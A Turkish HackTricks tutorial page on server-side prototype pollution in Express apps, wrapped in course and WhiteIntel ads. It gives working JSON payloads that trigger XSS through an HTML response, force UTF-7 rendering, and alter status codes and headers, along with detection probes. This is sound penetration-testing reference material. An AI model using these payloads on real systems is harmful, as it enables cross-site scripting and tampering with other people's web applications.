# Express Prototype Pollution Gadgets

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

- **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
- [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
- [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
- **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** takip edin.**
- **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), **karanlık ağ** destekli bir arama motorudur ve şirketin veya müşterilerinin **hırsız kötü amaçlı yazılımlar** tarafından **kompromize edilip edilmediğini** kontrol etmek için ücretsiz işlevler sunar.

WhiteIntel'in başlıca amacı, bilgi çalan kötü amaçlı yazılımlardan kaynaklanan hesap ele geçirmeleri ve fidye yazılımı saldırılarıyla mücadele etmektir.

Websitesini ziyaret edebilir ve motorlarını **ücretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

---

## XSS yanıtlarını sunun

**Daha fazla ayrıntı için [orijinal araştırmaya göz atın](https://portswigger.net/research/server-side-prototype-pollution)**

### JSON içerik türünü HTML olarak değiştirin

Bir Express uygulamasında **JSON içerik türü yanıtı** kullanarak ve bir JSON yansıtarak:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
Bu durumlarda XSS genellikle JSON içerik türüyle mümkün olmaz. Bununla birlikte, prototype pollution ile Express'i bir HTML yanıtı sunmaya **yanıltabiliriz.** Bu zafiyet, uygulamanın **`res.send(obj)`** kullanmasına ve application/json içerik türüyle body ayrıştırıcısını kullanmasına dayanır.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
### UTF7 Rendeleme

Express, UTF-7 içeriğini **şu şekilde** render etmesini sağlamak mümkündür:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Güvenli Tarama Teknikleri

### JSON boşlukları

Aşağıdaki PP, bir JSON içindeki özelliklere işlevselliği bozmayacak ek bir boşluk ekleyecektir:
```json
{"__proto__":{"json spaces": " "}}
```
Ardından yansıtılan JSON şu şekilde görünecektir:
```json
{"foo":  "bar"} -- Note the extra space
```
### Açık Başlıklar

Aşağıdaki PP cihazı sunucunun **`Access-Control-Expose_headers: foo`** HTTP başlığını geri göndermesini sağlayacaktır.
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
**CORS modülünün yüklü olması gerekmektedir**

### **OPTIONS Metodu**

Aşağıdaki yük ile bir OPTIONS yanıtından bir metod gizlemek mümkündür:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Durum**

Aşağıdaki PP yükü kullanılarak **döndürülen durum kodu** değiştirilebilir:
```json
{"__proto__":{"status":510}}
```
### Hata

Prototipe bir dize gibi bir ilkel değer atadığınızda, prototipin bir nesne olması gerektiği için bir **boş işlem üretir**. Eğer bir prototip nesnesini `Object.prototype`'e atamaya çalışırsanız, bu bir **istisna fırlatacaktır**. Bu iki davranışı kullanarak **prototip kirliliğinin başarılı olup olmadığını tespit edebiliriz**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Yansıtılan Değer

Bir uygulama yanıtında bir nesne içerdiğinde, `__proto__` ile birlikte **olağandışı bir isme sahip bir özellik oluşturmak**, bilgilendirici olabilir. Özellikle, yanıtta **yalnızca olağandışı özelliğin** döndürülmesi, uygulamanın zafiyetini işaret edebilir:
```json
{"unusualName":"value","__proto__":"test"}
```
Ayrıca, Lodash gibi bir kütüphane kullanıldığında, bir özelliği hem prototip kirliliği (PP) aracılığıyla hem de doğrudan nesnenin içine ayarlamak, başka bir teşhis yaklaşımı sunar. Eğer bu tür bir özellik yanıttan çıkarılırsa, bu, Lodash'ın birleştirmeden önce hedef nesnede özelliğin varlığını doğruladığını gösterir:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Çeşitli

### Noktalara İzin Ver

Express'te **sorgu dizesi parametrelerinden nesneler oluşturmanıza izin veren** bir seçenek bulunmaktadır.\
Bu seçeneği kesinlikle bir hata **zincirinde** kullanarak bir **prototype pollution zafiyetini** sömürmekte kullanabilirsiniz.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` Node'da bir nesne oluşturur.**

## Referanslar

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)


### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), **karanlık web** destekli bir arama motorudur ve şirketin veya müşterilerinin **hırsız kötü amaçlı yazılımlar** tarafından **kompromize edilip edilmediğini** kontrol etmek için **ücretsiz** işlevsellikler sunar.

WhiteIntel'in başlıca amacı, bilgi çalan kötü amaçlı yazılımlardan kaynaklanan hesap ele geçirmeleri ve fidye yazılımı saldırılarıyla mücadele etmektir.

Websitesini ziyaret edebilir ve **ücretsiz** olarak motorlarını deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'da **takip edin**.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
